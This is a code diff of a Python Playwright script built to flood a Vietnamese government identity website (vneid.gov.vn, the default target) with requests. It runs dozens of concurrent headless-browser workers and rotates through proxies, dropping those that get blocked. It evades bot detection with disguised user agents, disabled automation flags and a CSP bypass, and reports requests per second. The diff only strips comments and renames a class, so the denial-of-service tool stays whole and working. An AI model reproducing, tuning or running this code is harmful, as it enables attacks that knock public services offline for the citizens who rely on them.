@@ -6,16 +6,16 @@ import json
 from playwright.async_api import async_playwright
 
 TARGET_URL = os.getenv("TARGET_URL", "https://vneid.gov.vn/")
-DURATION = int(os.getenv("DURATION", "60"))   # tăng thời gian tấn công
-CONCURRENCY = int(os.getenv("CONCURRENCY", "50"))  # tăng số lượng worker
-REQ_PER_LOOP = int(os.getenv("REQ_PER_LOOP", "20"))  # tăng số request mỗi vòng
+DURATION = int(os.getenv("DURATION", "60"))
+CONCURRENCY = int(os.getenv("CONCURRENCY", "50"))
+REQ_PER_LOOP = int(os.getenv("REQ_PER_LOOP", "20"))
 PROXY_FILE = os.getenv("PROXY_FILE", "proxy.txt")
-MAX_FAILURES = int(os.getenv("MAX_FAILURES", "2"))  # giảm số lần thất bại cho phép
-PROXY_COOLDOWN = int(os.getenv("PROXY_COOLDOWN", "20"))  # giảm thời gian chờ
-REQUEST_TIMEOUT = int(os.getenv("REQUEST_TIMEOUT", "60000"))  # tăng timeout
-MAX_RETRIES = int(os.getenv("MAX_RETRIES", "5"))  # tăng số lần thử lại
-MIN_DELAY = float(os.getenv("MIN_DELAY", "0.1"))  # độ trễ tối thiểu giữa các request
-MAX_DELAY = float(os.getenv("MAX_DELAY", "0.5"))  # độ trễ tối đa giữa các request
+MAX_FAILURES = int(os.getenv("MAX_FAILURES", "2"))
+PROXY_COOLDOWN = int(os.getenv("PROXY_COOLDOWN", "20"))
+REQUEST_TIMEOUT = int(os.getenv("REQUEST_TIMEOUT", "60000"))
+MAX_RETRIES = int(os.getenv("MAX_RETRIES", "5"))
+MIN_DELAY = float(os.getenv("MIN_DELAY", "0.1"))
+MAX_DELAY = float(os.getenv("MAX_DELAY", "0.5"))
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
@@ -31,7 +31,7 @@ success = 0
 fail = 0
 status_count = {}
 
-class AdvancedProxyManager:
+class ProxyManager:
     def __init__(self, proxy_file):
         self.proxy_file = proxy_file
         self.proxies = self.load_proxies()
@@ -41,7 +41,6 @@ class AdvancedProxyManager:
         self.proxy_performance = {}
     
     def load_proxies(self):
-        """Load proxies from file"""
         proxies = []
         try:
             with open(self.proxy_file, 'r') as f:
@@ -59,50 +58,41 @@ class AdvancedProxyManager:
             return []
     
     async def get_next_proxy(self):
-        """Get next available proxy based on performance"""
         async with self.lock:
             if not self.proxies:
                 return None
             
-            # Calculate performance score for each proxy
             for proxy in self.proxies:
                 if proxy in self.proxy_performance:
                     perf = self.proxy_performance[proxy]
-                    # Performance score = success rate / average response time
                     success_rate = perf["success_count"] / max(1, perf["total_count"])
                     avg_response_time = sum(perf["response_times"]) / max(1, len(perf["response_times"]))
-                    perf["score"] = success_rate / max(0.1, avg_response_time / 1000)  # Normalize response time to seconds
+                    perf["score"] = success_rate / max(0.1, avg_response_time / 1000)
                 else:
                     self.proxy_performance[proxy] = {
                         "success_count": 0,
                         "total_count": 0,
                         "response_times": [],
-                        "score": 0.1  # Default score for untested proxies
+                        "score": 0.1
                     }
             
-            # Sort proxies by performance score (descending)
             sorted_proxies = sorted(
                 self.proxies, 
                 key=lambda p: self.proxy_performance[p]["score"],
                 reverse=True
             )
             
-            # Try to find a proxy that's not blocked
             for proxy in sorted_proxies:
                 proxy_info = self.proxy_status[proxy]
-                
-                # Check if proxy is blocked or in cooldown
                 current_time = time.time()
                 if (not proxy_info["blocked"] and 
                     (current_time - proxy_info["last_failure"] > PROXY_COOLDOWN or 
                      proxy_info["failures"] < MAX_FAILURES)):
                     return proxy
             
-            # If all proxies are blocked, return the one with the highest score
             return sorted_proxies[0] if sorted_proxies else None
     
     async def mark_proxy_result(self, proxy, success, response_time=None):
-        """Mark a proxy result and update performance metrics"""
         if proxy and proxy in self.proxy_status:
             async with self.lock:
                 if success:
@@ -110,18 +100,15 @@ class AdvancedProxyManager:
                     self.proxy_status[proxy]["last_failure"] = 0
                     self.proxy_status[proxy]["success_count"] += 1
                     
-                    # Update performance metrics
                     if proxy in self.proxy_performance and response_time:
                         perf = self.proxy_performance[proxy]
                         perf["success_count"] += 1
                         perf["total_count"] += 1
                         perf["response_times"].append(response_time)
                         
-                        # Keep only the last 10 response times
                         if len(perf["response_times"]) > 10:
                             perf["response_times"] = perf["response_times"][-10:]
                         
-                        # Recalculate score
                         success_rate = perf["success_count"] / max(1, perf["total_count"])
                         avg_response_time = sum(perf["response_times"]) / max(1, len(perf["response_times"]))
                         perf["score"] = success_rate / max(0.1, avg_response_time / 1000)
@@ -129,18 +116,15 @@ class AdvancedProxyManager:
                     self.proxy_status[proxy]["failures"] += 1
                     self.proxy_status[proxy]["last_failure"] = time.time()
                     
-                    # Block proxy if it failed too many times
                     if self.proxy_status[proxy]["failures"] >= MAX_FAILURES:
                         self.proxy_status[proxy]["blocked"] = True
                         print(f"Proxy {proxy} blocked due to too many failures")
     
     def get_proxy_stats(self):
-        """Get statistics about proxy status"""
         total = len(self.proxies)
         blocked = sum(1 for proxy in self.proxies if self.proxy_status[proxy]["blocked"])
         available = total - blocked
         
-        # Get top 5 best proxies
         best_proxies = sorted(
             self.proxies, 
             key=lambda p: self.proxy_performance[p]["score"] if p in self.proxy_performance else 0,
@@ -155,25 +139,21 @@ class AdvancedProxyManager:
         }
 
 async def make_request_with_retry(context, url, proxy_manager, proxy, max_retries=MAX_RETRIES):
-    """Make a request with retry logic and performance tracking"""
     start_time = time.time()
     
     for attempt in range(max_retries + 1):
         try:
             response = await context.request.get(url, timeout=REQUEST_TIMEOUT)
-            response_time = int((time.time() - start_time) * 1000)  # Convert to milliseconds
+            response_time = int((time.time() - start_time) * 1000)
             
-            # Mark proxy result
             await proxy_manager.mark_proxy_result(proxy, response.ok, response_time)
             
             return response
         except Exception as e:
             if attempt < max_retries:
-                # Wait before retry (exponential backoff)
-                wait_time = min(2 ** attempt, 5)  # Max wait time is 5 seconds
+                wait_time = min(2 ** attempt, 5)
                 await asyncio.sleep(wait_time)
             else:
-                # Mark proxy as failed
                 await proxy_manager.mark_proxy_result(proxy, False)
                 raise e
 
@@ -183,7 +163,6 @@ async def attack(playwright, worker_id, proxy_manager):
     ua = random.choice(USER_AGENTS)
     lang = random.choice(ACCEPT_LANG)
     
-    # Get initial proxy
     proxy = await proxy_manager.get_next_proxy()
     
     browser_args = [
@@ -201,12 +180,11 @@ async def attack(playwright, worker_id, proxy_manager):
         "--disable-software-rasterizer",
         "--disable-extensions",
         "--disable-plugins",
-        "--disable-images",  # Disable images to speed up loading
-        "--disable-javascript-har-prometheus-prometheus",  # Disable some browser fingerprinting
-        "--disable-blink-features=AutomationControlled"  # Disable automation detection
+        "--disable-images",
+        "--disable-javascript-har-prometheus-prometheus",
+        "--disable-blink-features=AutomationControlled"
     ]
     
-    # Launch browser with or without proxy
     if proxy:
         try:
             browser = await playwright.chromium.launch(
@@ -219,7 +197,6 @@ async def attack(playwright, worker_id, proxy_manager):
             print(f"Worker {worker_id} using proxy: {proxy}")
         except Exception as e:
             print(f"Worker {worker_id}: Failed to launch browser with proxy {proxy}: {e}")
-            # Try without proxy
             browser = await playwright.chromium.launch(
                 headless=True,
                 args=browser_args
@@ -248,21 +225,19 @@ async def attack(playwright, worker_id, proxy_manager):
             "Sec-Fetch-User": "?1"
         },
         ignore_https_errors=True,
-        java_script_enabled=False,  # Disable JavaScript to avoid detection
-        bypass_csp=True  # Bypass Content Security Policy
+        java_script_enabled=False,
+        bypass_csp=True
     )
 
     start = time.time()
     consecutive_failures = 0
     proxy_rotation_count = 0
-    max_proxy_rotations = 20  # Increased maximum number of proxy rotations per worker
+    max_proxy_rotations = 20
     
     while time.time() - start < DURATION and proxy_rotation_count < max_proxy_rotations:
         try:
-            # Create tasks with random delays to simulate human behavior
             tasks = []
             for i in range(REQ_PER_LOOP):
-                # Add random delay between requests
                 delay = random.uniform(MIN_DELAY, MAX_DELAY)
                 tasks.append(asyncio.sleep(delay))
                 tasks.append(make_request_with_retry(context, TARGET_URL, proxy_manager, proxy))
@@ -272,9 +247,8 @@ async def attack(playwright, worker_id, proxy_manager):
             batch_success = 0
             batch_fail = 0
 
-            # Process only the request results (skip sleep results)
             for i, res in enumerate(results):
-                if i % 2 == 1:  # Every other result is a request (odd indices)
+                if i % 2 == 1:
                     if isinstance(res, Exception):
                         fail += 1
                         batch_fail += 1
@@ -289,30 +263,25 @@ async def attack(playwright, worker_id, proxy_manager):
                             batch_fail += 1
                             status_count[res.status] = status_count.get(res.status, 0) + 1
             
-            # Check if we need to rotate proxy
             if proxy:
                 total_requests = batch_success + batch_fail
                 success_rate = batch_success / total_requests if total_requests > 0 else 0
                 
-                if success_rate < 0.1:  # Lower threshold for proxy rotation (10%)
+                if success_rate < 0.1:
                     consecutive_failures += 1
                     
-                    # If too many consecutive failures, rotate proxy
-                    if consecutive_failures >= 1:  # Reduced threshold for faster rotation
+                    if consecutive_failures >= 1:
                         print(f"Worker {worker_id}: Low success rate ({success_rate:.2%}) with proxy {proxy}, rotating...")
                         
-                        # Close current browser and context
                         await context.close()
                         await browser.close()
                         
-                        # Get new proxy
                         new_proxy = await proxy_manager.get_next_proxy()
                         if new_proxy != proxy:
                             proxy = new_proxy
                             proxy_rotation_count += 1
                             print(f"Worker {worker_id} switched to new proxy ({proxy_rotation_count}/{max_proxy_rotations}): {proxy}")
                             
-                            # Launch new browser with new proxy
                             try:
                                 browser = await playwright.chromium.launch(
                                     headless=True,
@@ -341,7 +310,6 @@ async def attack(playwright, worker_id, proxy_manager):
                                 )
                             except Exception as e:
                                 print(f"Worker {worker_id}: Failed to launch browser with new proxy {proxy}: {e}")
-                                # Try without proxy
                                 browser = await playwright.chromium.launch(
                                     headless=True,
                                     args=browser_args
@@ -368,7 +336,6 @@ async def attack(playwright, worker_id, proxy_manager):
                         
                         consecutive_failures = 0
                 else:
-                    # If batch was successful, reset consecutive failures
                     consecutive_failures = 0
             
         except Exception as e:
@@ -379,10 +346,8 @@ async def attack(playwright, worker_id, proxy_manager):
     await browser.close()
 
 async def main():
-    # Initialize proxy manager
-    proxy_manager = AdvancedProxyManager(PROXY_FILE)
+    proxy_manager = ProxyManager(PROXY_FILE)
     
-    # Print proxy statistics
     stats = proxy_manager.get_proxy_stats()
     print(f"Proxy statistics: {stats['total']} total, {stats['available']} available, {stats['blocked']} blocked")
     print(f"Top 5 best proxies: {stats['best_proxies']}")
@@ -404,7 +369,6 @@ async def main():
     print(f"RPS ~ {total / DURATION:.2f}")
     print("Status breakdown:", status_count)
     
-    # Print final proxy statistics
     stats = proxy_manager.get_proxy_stats()
     print(f"Final proxy statistics: {stats['total']} total, {stats['available']} available, {stats['blocked']} blocked")
     print(f"Top 5 best proxies: {stats['best_proxies']}")
